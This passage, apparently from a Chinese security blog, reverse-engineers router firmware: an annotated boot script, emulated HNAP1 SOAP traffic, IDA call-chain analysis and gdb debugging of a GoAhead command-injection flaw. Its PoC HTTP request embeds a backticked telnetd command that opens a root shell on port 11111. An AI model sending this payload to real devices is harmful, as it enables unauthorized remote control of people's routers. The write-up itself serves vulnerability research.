class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/sh</span><br><br>ifconfig lo 127.0.0.1 // 配置回环网络接口，设置IP地址为127.0.0.1<br><br>CINIT=1 // 设置环境变量CINIT为1<br><br>hostname rlx-linux // 设置主机名为rlx-linux<br><br>mount -t proc proc /proc // 挂载proc文件系统到/proc<br>mount -t ramfs ramfs /var // 挂载ramfs文件系统到/var<br>if [ -d &quot;/hw_setting&quot; ];then<br>    mount -t yaffs2 -o tags-ecc-off -o inband-tags /dev/mtdblock1 /hw_setting // 如果存在/hw_setting目录，挂载yaffs2文件系统到/hw_setting<br>fi<br><br>mkdir /var/tmp // 创建/var/tmp目录<br>mkdir /var/web // 创建/var/web目录<br>mkdir /var/log // 创建/var/log目录<br>mkdir /var/run // 创建/var/run目录<br>mkdir /var/lock // 创建/var/lock目录<br>mkdir /var/system // 创建/var/system目录<br>mkdir /var/dnrd // 创建/var/dnrd目录<br>mkdir /var/avahi // 创建/var/avahi目录<br>mkdir /var/dbus-1 // 创建/var/dbus-1目录<br>mkdir /var/run/dbus // 创建/var/run/dbus目录<br>mkdir /var/lib // 创建/var/lib目录<br>mkdir /var/lib/misc // 创建/var/lib/misc目录<br>mkdir /var/home // 创建/var/home目录<br>mkdir /var/root // 创建/var/root目录<br>mkdir /var/tmp/net // 创建/var/tmp/net目录<br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">##for tr069</span></span><br>mkdir /var/cwmp_default // 创建/var/cwmp_default目录<br>mkdir /var/cwmp_config // 创建/var/cwmp_config目录<br><br>if [ ! -f /var/cwmp_default/DefaultCwmpNotify.txt ]; then<br>	cp -p /etc/DefaultCwmpNotify.txt /var/cwmp_default/DefaultCwmpNotify.txt 2&gt;/dev/null // 如果/var/cwmp_default/DefaultCwmpNotify.txt不存在，则从/etc复制文件到/var/cwmp_default<br>fi<br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">#For miniigd</span></span><br>mkdir /var/linuxigd // 创建/var/linuxigd目录<br>cp /etc/tmp/pics* /var/linuxigd 2&gt;/dev/null // 复制/etc/tmp/pics*到/var/linuxigd<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment">#For pptp</span></span><br>mkdir /var/ppp // 创建/var/ppp目录<br>mkdir /var/ppp/peers // 创建/var/ppp/peers目录<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">smbd</span><br>mkdir /var/config // 创建/var/config目录<br>mkdir /var/private // 创建/var/private目录<br>mkdir /var/tmp/usb // 创建/var/tmp/usb目录<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">snmpd</span><br>mkdir /var/net-snmp // 创建/var/net-snmp目录<br><br>cp /bin/pppoe.sh /var/ppp/true // 复制/bin/pppoe.sh到/var/ppp/true<br>echo &quot;#!/bin/sh&quot; &gt; /var/ppp/true // 覆盖/var/ppp/true内容为#!/bin/sh<br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;PASS&quot;</span>     &gt;&gt; /var/ppp/true</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-keyword">for</span> console login</span><br>cp /etc/shadow.sample /var/shadow // 复制/etc/shadow.sample到/var/shadow<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-keyword">for</span> weave</span><br>cp /etc/avahi-daemon.conf /var/avahi // 复制/etc/avahi-daemon.conf到/var/avahi<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">extact web pages</span><br>cd /web // 切换到/web目录<br><span class="hljs-meta prompt_">#</span><span class="language-bash">flash extr /web</span><br>cd / // 切换到根目录<br><br>mkdir -p /var/udhcpc // 创建/var/udhcpc目录<br>mkdir -p /var/udhcpd // 创建/var/udhcpd目录<br>cp /bin/init.sh /var/udhcpc/eth0.deconfig // 复制/bin/init.sh到/var/udhcpc/eth0.deconfig<br>echo &quot; &quot; &gt; /var/udhcpc/eth0.deconfig // 清空/var/udhcpc/eth0.deconfig文件内容<br>cp /bin/init.sh /var/udhcpc/eth1.deconfig // 复制/bin/init.sh到/var/udhcpc/eth1.deconfig<br>echo &quot; &quot; &gt; /var/udhcpc/eth1.deconfig // 清空/var/udhcpc/eth1.deconfig文件内容<br>cp /bin/init.sh /var/udhcpc/br0.deconfig // 复制/bin/init.sh到/var/udhcpc/br0.deconfig<br>echo &quot; &quot; &gt; /var/udhcpc/br0.deconfig // 清空/var/udhcpc/br0.deconfig文件内容<br>cp /bin/init.sh /var/udhcpc/wlan0.deconfig // 复制/bin/init.sh到/var/udhcpc/wlan0.deconfig<br>echo &quot; &quot; &gt; /var/udhcpc/wlan0.deconfig // 清空/var/udhcpc/wlan0.deconfig文件内容<br><br>if [ &quot;$CINIT&quot; = 1 ]; then<br>startup.sh // 如果CINIT等于1，则执行startup.sh脚本<br>fi<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-keyword">for</span> wapi certs related</span><br>mkdir /var/myca // 创建/var/myca目录<br><span class="hljs-meta prompt_"># </span><span class="language-bash">wapi cert(must <span class="hljs-keyword">done</span> before init.sh)</span><br>cp -rf /usr/local/ssl/* /var/myca/ 2&gt;/dev/null // 复制/usr/local/ssl/*到/var/myca<br><span class="hljs-meta prompt_"># </span><span class="language-bash">loadWapiFiles &gt;/dev/null 2&gt;&amp;1</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-keyword">for</span> wireless client mode 802.1x</span><br>mkdir /var/1x // 创建/var/1x目录<br>cp -rf /usr/1x/* /var/1x/ 2&gt;/dev/null // 复制/usr/1x/*到/var/1x<br>mkdir /var/openvpn // 创建/var/openvpn目录<br>cp -rf /usr/share/openvpn/* /var/openvpn 2&gt;/dev/null // 复制/usr/share/openvpn/*到/var/openvpn<br><span class="hljs-meta prompt_">#</span><span class="language-bash">---------------------------------------------------------------------------</span><br>SHARE_WIFI_DISABLE=`flash get WLAN1_VAP3_WLAN_DISABLED` // 从flash获取WLAN1_VAP3_WLAN_DISABLED的值<br>if [ &quot;$SHARE_WIFI_DISABLE&quot; = &quot;WLAN1_VAP3_WLAN_DISABLED=0&quot; ];then<br>	flash set WLAN1_VAP3_WLAN_DISABLED 1 // 如果WLAN1_VAP3_WLAN_DISABLED等于0，则设置其为1<br>fi<br><span class="hljs-meta prompt_">#</span><span class="language-bash">---------------------------------------------------------------------------</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">Start system script</span><br>init.sh gw all // 执行init.sh脚本，传递参数gw all<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">modify dst-cache setting</span><br>echo &quot;24576&quot; &gt; /proc/sys/net/ipv4/route/max_size // 设置最大路由缓存大小为24576<br>echo &quot;180&quot; &gt; /proc/sys/net/ipv4/route/gc_thresh // 设置路由垃圾回收阈值为180<br>echo 20 &gt; /proc/sys/net/ipv4/route/gc_elasticity // 设置路由垃圾回收弹性为20<br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">echo</span> 35 &gt; /proc/sys/net/ipv4/route/gc_interval</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">echo</span> 60 &gt; /proc/sys/net/ipv4/route/secret_interval</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">echo</span> 10 &gt; /proc/sys/net/ipv4/route/gc_timeout</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;4096&quot;</span> &gt; /proc/sys/net/nf_conntrack_max</span><br>echo &quot;12288&quot; &gt; /proc/sys/net/netfilter/nf_conntrack_max // 设置网络连接跟踪表的最大大小为12288<br>echo &quot;600&quot; &gt; /proc/sys/net/ipv4/netfilter/ip_conntrack_tcp_timeout_established // 设置TCP连接跟踪表的超时时间为600秒<br>echo &quot;20&quot; &gt; /proc/sys/net/ipv4/netfilter/ip_conntrack_tcp_timeout_time_wait // 设置TCP等待时间的超时时间为20秒<br>echo &quot;20&quot; &gt; /proc/sys/net/ipv4/netfilter/ip_conntrack_tcp_timeout_close // 设置TCP关闭状态的超时时间为20秒<br>echo &quot;90&quot; &gt; /proc/sys/net/ipv4/netfilter/ip_conntrack_udp_timeout // 设置UDP连接跟踪表的超时时间为90秒<br>echo &quot;120&quot; &gt; /proc/sys/net/ipv4/netfilter/ip_conntrack_udp_timeout_stream // 设置UDP流的超时时间为120秒<br>echo &quot;90&quot; &gt; /proc/sys/net/ipv4/netfilter/ip_conntrack_generic_timeout // 设置通用连接跟踪表的超时时间为90秒<br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;1048576&quot;</span> &gt; /proc/sys/net/ipv4/rt_cache_rebuild_count</span><br>echo &quot;32&quot; &gt; /proc/sys/net/netfilter/nf_conntrack_expect_max // 设置期望的最大连接跟踪表大小为32<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">modify IRQ Affinity setting</span><br>echo &quot;3&quot; &gt; /proc/irq/33/smp_affinity // 设置IRQ 33的SMP亲和性为3<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/ip_forward <span class="hljs-comment">#don&#x27;t enable ip_forward before set MASQUERADE</span></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-built_in">echo</span> 2048 &gt; /proc/sys/net/core/hot_list_length</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">start web server</span><br>ls /bin/watchdog &gt; /dev/null &amp;&amp; watchdog 1000&amp; // 检查/bin/watchdog是否存在，如果存在则启动watchdog<br><span class="hljs-meta prompt_">#</span><span class="language-bash">boa</span><br><br>goahead &amp; // 启动goahead web服务器<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">Turn off the power led of orange</span><br>echo &quot;29&quot; &gt; /sys/class/gpio/export // 导出GPIO 29<br>echo &quot;out&quot; &gt; /sys/class/gpio/gpio29/direction // 设置GPIO 29为输出方向<br>echo &quot;1&quot; &gt; /sys/class/gpio/gpio29/value // 设置GPIO 29的值为1<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">Turn on the power led of green</span><br>echo &quot;30&quot; &gt; /sys/class/gpio/export // 导出GPIO 30<br>echo &quot;out&quot; &gt; /sys/class/gpio/gpio30/direction // 设置GPIO 30为输出方向<br>echo &quot;0&quot; &gt; /sys/class/gpio/gpio30/value // 设置GPIO 30的值为0<br><br>cp /etc/passwd_orig /var/passwd // 复制/etc/passwd_orig到/var/passwd<br>cp /etc/group_orig /var/group // 复制/etc/group_orig到/var/group<br>MODE=`flash get HW_FACTORY_MODE` // 从flash获取HW_FACTORY_MODE的值<br>if [ &quot;$MODE&quot; = &quot;HW_FACTORY_MODE=1&quot; ];then<br>telnetd&amp; // 如果HW_FACTORY_MODE等于1，则启动telnetd<br>fi<br><span class="hljs-meta prompt_">#</span><span class="language-bash">telnetd&amp;</span><br>ifconfig wlan1-va3 down // 关闭wlan1-va3网络接口<br>speedcheck&amp; // 启动speedcheck脚本<br><span class="hljs-meta prompt_">#</span><span class="language-bash">wiair_client&amp;</span><br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="固件模拟"><a href="#固件模拟" class="headerlink" title="固件模拟"></a>固件模拟</h3><p>FirmAE模拟</p>
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/age-20240803210555510.png" srcset="/img/loading.gif" lazyload alt="image-20240803210555510"></p>
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>已知这里有一个命令执行</p>
+<p>burp抓包分析</p>
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/age-20240803205522223.png" srcset="/img/loading.gif" lazyload alt="image-20240803205522223"></p>
+<p>访问任意一个页面时都会有很多提交到&#x2F;HNAP1的数据包</p>
+<p>例如</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/HNAP1/</span> <span class="hljs-meta">HTTP/1.1</span><br><br><span class="language-apache"><span class="hljs-attribute">Host</span>: <span class="hljs-number">192.168.0.1</span></span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (X11; Ubuntu; Linux x86_64; rv:<span class="hljs-number">109</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">113</span>.<span class="hljs-number">0</span></span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">Accept</span>: */*</span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">Accept</span>-Language: en-US,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span></span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate, br</span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">Content</span>-Type: text/xml; charset=utf-<span class="hljs-number">8</span></span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">SOAPAction</span>: <span class="hljs-string">&quot;http://purenetworks.com/HNAP1/GetGuestNetworkSettings&quot;</span></span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">HNAP_AUTH</span>: <span class="hljs-number">006</span>FA439BC663762183CE374D1714F35 <span class="hljs-number">1722689296</span></span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">X</span>-Requested-With: XMLHttpRequest</span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">312</span></span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">Origin</span>: http://<span class="hljs-number">192.168.0.1</span></span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">Connection</span>: close</span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">Referer</span>: http://<span class="hljs-number">192.168.0.1</span>/Network.html</span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">Cookie</span>: uid=ujcI4DPmyw; PrivateKey=<span class="hljs-number">3</span>CC07A3F1F2C3719793D6EDA22C272E9; timeout=<span class="hljs-number">0</span></span><br><span class="language-apache"></span><br><span class="language-apache"></span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-section">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><span class="hljs-section">&lt;soap:Envelope xmlns:xsi=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> xmlns:xsd=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema&quot;</span> xmlns:soap=<span class="hljs-string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span><span class="hljs-section">&lt;soap:Body&gt;</span><span class="hljs-section">&lt;GetGuestNetworkSettings xmlns=<span class="hljs-string">&quot;http://purenetworks.com/HNAP1/&quot;</span> /&gt;</span><span class="hljs-section">&lt;/soap:Body&gt;</span><span class="hljs-section">&lt;/soap:Envelope&gt;</span></span><br></code></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-meta">HTTP/1.0</span> <span class="hljs-number">200</span> Data follows<br><br><span class="language-xml">Server: GoAhead-Webs</span><br><span class="language-xml"></span><br><span class="language-xml">Date: Sat Oct 31 18:33:08 2020</span><br><span class="language-xml"></span><br><span class="language-xml">Pragma: no-cache</span><br><span class="language-xml"></span><br><span class="language-xml">Cache-Control: no-cache</span><br><span class="language-xml"></span><br><span class="language-xml">Content-Type: text/html</span><br><span class="language-xml"></span><br><span class="language-xml">Location: </span><br><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">soap:Envelope</span></span></span><br><span class="hljs-tag"><span class="language-xml"><span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml"><span class="hljs-attr">xmlns:xsd</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml"><span class="hljs-attr">xmlns:soap</span>=<span class="hljs-string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">soap:Body</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">GetGuestNetworkSettingsResponse</span></span></span><br><span class="hljs-tag"><span class="language-xml"><span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://purenetworks.com/HNAP1/&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">GetGuestNetworkSettingsResult</span>&gt;</span>OK<span class="hljs-tag">&lt;/<span class="hljs-name">GetGuestNetworkSettingsResult</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">IPAddress</span>&gt;</span>192.168.100.1<span class="hljs-tag">&lt;/<span class="hljs-name">IPAddress</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">SubnetMask</span>&gt;</span>255.255.255.0<span class="hljs-tag">&lt;/<span class="hljs-name">SubnetMask</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">GetGuestNetworkSettingsResponse</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">soap:Body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">soap:Envelope</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
+
+<p>soap协议</p>
+<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">SOAP（Simple Object Access Protocol）是一种基于 <span class="hljs-keyword">XML</span> <span class="hljs-title">的通信协议，用于在网络上交换结构化的和标准化的信息。 它通常用于分布式系统中的应用程序之间进行通信。</span><br><span class="hljs-title"></span><br><span class="hljs-title">主要特点和用途：</span><br><span class="hljs-title">基于 XML</span>： SOAP 消息以 <span class="hljs-keyword">XML</span> <span class="hljs-title">格式编码，使其能够被广泛支持和理解。</span><br><span class="hljs-title"></span><br><span class="hljs-title">协议中立： 可以在多种传输协议上使用，如 HTTP</span>、SMTP、FTP 等，使得其具有很高的灵活性。<br><br>消息格式严格： SOAP 定义了严格的消息结构，包括头部和主体，使通信的结构清晰且可扩展。<br><br>跨平台和跨语言： SOAP 允许不同平台上的应用程序使用不同语言编写，通过标准化的 <span class="hljs-keyword">XML</span> <span class="hljs-title">格式进行通信。</span><br><span class="hljs-title"></span><br><span class="hljs-title">主要应用场景： SOAP</span> 最常见的用途是在 Web 服务中，例如用于不同系统之间的数据交换、远程调用（RPC）等。 它通过定义严格的消息格式和协议细节，确保了不同系统之间的互操作性和通信可靠性。<br><br>SOAP 的结构：<br>SOAP 消息通常由以下部分组成：<br><br>Envelope（信封）： 定义了消息的开始和结束，以及包含了必要的命名空间声明。<br><br>Header（头部）： 可选的部分，包含了关于消息的非业务性信息，比如身份验证、事务处理等。<br><br>Body（主体）： 包含了实际的消息内容，通常是请求或响应的具体数据。<br></code></pre></td></tr></table></figure>
+
+<p>hnap协议</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">HNAP1</span>（Home Network Administration Protocol <span class="hljs-number">1</span>）是一个用于管理家庭网络设备的协议。它通常与路由器、交换机等网络设备相关联，旨在提供一种标准化的方法，使用户能够远程管理和配置其家庭网络设备。<br></code></pre></td></tr></table></figure>
+
+
+
+<p>所以这里是获取了路由器的GuestNetworkSettings</p>
+<p>关键在于请求包中的SOAPAction: “<a target="_blank" rel="noopener" href="http://purenetworks.com/HNAP1/GetGuestNetworkSettings">http://purenetworks.com/HNAP1/GetGuestNetworkSettings</a>“</p>
+<p>在 SOAP 协议中，服务端通过解析 HTTP 请求头中的 SOAPAction 来确定客户端希望调用的具体操作。这种机制有助于确保在多个可能存在的操作中，正确地识别并处理客户端请求。</p>
+<p>因此， 表示客户端希望执行的是一个名为 GetGuestNetworkSettings 的操作。</p>
+<p>ida打开goahead二进制文件</p>
+<p>搜索字符串HNAP定位到sub_423F90()函数</p>
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/age-20240803214527009.png" srcset="/img/loading.gif" lazyload alt="image-20240803214527009"></p>
+<p>进入sub_42383C（）函数</p>
+<p>查看该函数调用链</p>
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/age-20240805102525280.png" srcset="/img/loading.gif" lazyload alt="image-20240805102525280"></p>
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/age-20240803214834875.png" srcset="/img/loading.gif" lazyload alt="image-20240803214834875"></p>
+<p>就是这里导致了命令执行</p>
+<p>poc</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/HNAP1/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.0.1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en-US,en;q=0.5<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>text/xml; charset=utf-8<br><span class="hljs-attribute">SOAPAction</span><span class="hljs-punctuation">: </span>&quot;http://purenetworks.com/HNAP1/GetWLanRadioSettings&quot;<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>28<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://192.168.0.1<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-1c">&#x27;`telnetd -p <span class="hljs-number">1111</span>1 /bin/sh`&#x27;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>接下来动调</p>
+<p>gdb</p>
+<figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gml">gdb-multiarch ./bin/goahead -<span class="hljs-variable language_">x</span> <span class="hljs-variable language_">script</span><br></code></pre></td></tr></table></figure>
+
+<p>script脚本</p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> arch <span class="hljs-comment">mips</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">endian little</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">sysroot lib</span>/<br>set solib-search-path lib/<br>target <span class="hljs-comment">remote 192.168.0.1:1337</span><br></code></pre></td></tr></table></figure>
+
+<p>下断点到函数sub_42383，看参数是如何被传入的</p>
+<p>sub_423f90无法下断点，会报错</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">b</span> *<span class="hljs-number">0</span>x0042383C<br></code></pre></td></tr></table></figure>
+
+<p>下断点下到这里</p>
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/age-20240804004942502.png" srcset="/img/loading.gif" lazyload alt="image-20240804004942502"></p>
+<p>请求包已经被拆解</p>
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/age-20240804004909920.png" srcset="/img/loading.gif" lazyload alt="image-20240804004909920"></p>
+<p>看一下栈上的信息</p>
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/age-20240804005342709.png" srcset="/img/loading.gif" lazyload alt="image-20240804005342709"></p>
+<p>开始处理返回包了</p>
+<p>继续执行发现无论如何调试都会执行到原来的地方</p>
+<p>猜测是进入了for循环</p>
